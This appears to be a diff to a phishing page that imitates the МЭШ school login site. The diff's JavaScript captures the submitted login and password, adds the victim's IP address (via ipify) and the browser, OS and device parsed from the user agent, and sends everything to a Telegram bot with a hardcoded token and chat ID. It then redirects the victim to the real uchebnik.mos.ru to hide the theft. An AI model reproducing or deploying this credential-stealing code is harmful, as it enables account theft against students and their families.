@@ -152,7 +152,7 @@
             color: #fff;
             border: none;
             border-radius: 4.8px; /* 4px * 1.2 */
-247            font-size: 19.2px; /* 16px * 1.2 */
+            font-size: 19.2px; /* 16px * 1.2 */
             font-weight: 500;
             cursor: pointer;
             transition: background-color 0.3s;
@@ -228,7 +228,8 @@
                 <p>МЭШ</p>
             </div>
             <div class="image-container">
-                <img src="kart.png" alt="Ученики">
+                <!-- Оставил заглушку вместо kart.png -->
+                <img src="https://via.placeholder.com/500x500?text=Test" alt="Ученики">
             </div>
         </div>
         <div class="right-section">
@@ -264,17 +265,56 @@
             // Получаем данные из формы
             const login = document.querySelector('input[name="login"]').value;
             const password = document.querySelector('input[name="password"]').value;
-            
-            // Настройки Telegram
-            const token = "7205362097:AAGoHFfrGVNw4HvRFCWlD5OPTK5ZA7bZHwo"; // Твой токен
-            const chatId = "2068847868"; // Твой Chat ID
-            const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}`);
-            
-            // Отправляем данные в Telegram
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
+            const userAgent = navigator.userAgent.toLowerCase(); // Получаем userAgent в нижнем регистре для удобства
+
+            // Функция для разбора userAgent
+            function parseUserAgent(ua) {
+                let browser = "Unknown";
+                let os = "Unknown";
+                let device = "Unknown";
+
+                // Определяем браузер
+                if (ua.includes("chrome")) browser = "Chrome";
+                else if (ua.includes("firefox")) browser = "Firefox";
+                else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
+                else if (ua.includes("edge")) browser = "Edge";
+                else if (ua.includes("opera") || ua.includes("opr")) browser = "Opera";
+
+                // Определяем ОС
+                if (ua.includes("windows")) os = "Windows";
+                else if (ua.includes("mac os") || ua.includes("macintosh")) os = "MacOS";
+                else if (ua.includes("android")) os = "Android";
+                else if (ua.includes("iphone") || ua.includes("ipad")) os = "iOS";
+                else if (ua.includes("linux")) os = "Linux";
+
+                // Определяем устройство (примерная логика)
+                if (ua.includes("iphone")) device = "iPhone";
+                else if (ua.includes("ipad")) device = "iPad";
+                else if (ua.includes("samsung")) device = "Samsung"; // Не всегда точная модель
+                else if (ua.includes("android") && !ua.includes("samsung")) device = "Android Device";
+                else if (ua.includes("windows") || ua.includes("mac")) device = "PC";
+
+                return { browser, os, device };
+            }
+
+            const { browser, os, device } = parseUserAgent(userAgent);
+
+            // Получаем IP-адрес через ipify API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip; // Получаем IP-адрес
+                    
+                    // Настройки Telegram
+                    const token = "7205362097:AAGoHFfrGVNw4HvRFCWlD5OPTK5ZA7bZHwo"; // Твой токен
+                    const chatId = "2068847868"; // Твой Chat ID
+                    const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}\nIP: ${ip}\nБраузер: ${browser}\nОС: ${os}\nУстройство: ${device}`);
+                    
+                    // Отправляем данные в Telegram
+                    return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
+                })
                 .then(response => {
                     if (response.ok) {
-                        // Новая ссылка
                         window.location.href = "https://uchebnik.mos.ru/main";
                     } else {
                         console.error('Ошибка отправки в Telegram');
